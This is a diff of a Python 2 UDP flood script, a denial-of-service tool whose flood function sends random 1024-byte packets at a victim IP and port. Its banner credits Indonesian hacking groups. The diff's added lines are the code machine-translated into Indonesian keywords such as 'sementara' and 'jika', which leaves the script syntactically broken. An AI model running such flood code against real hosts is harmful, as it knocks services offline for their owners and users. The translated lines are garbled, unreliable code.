@@ -21,7 +21,7 @@ def usage():
     print(colored("194519451945194519451945194519451945194519451945",'white'))
     print(colored("194519451945194519451945194519451945194519451945",'white'))
 
-    print(colored("Thanks : All Member </CC4>\n", 'green'))
+    print ( berwarna ( "kutubuku cyber team \ n" , 'hijau' ))
     print "Caranya Ketik: python2 " + sys.argv[0] + " -ip- -port- -packet-"
 
 
@@ -30,11 +30,11 @@ def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # Thankssss yaa buat Member CC4,SORA,W3LL,INDOSEC
     bytes = random._urandom(1024)
-    timeout =  time.time() + duration
+    batas  waktu =   waktu . waktu () +  durasi
     sent = 0
 
-    while 1:
-        if time.time() > timeout:
+    sementara  1 :
+        jika  waktunya . time () >  timeout :
             break
         else:
             pass
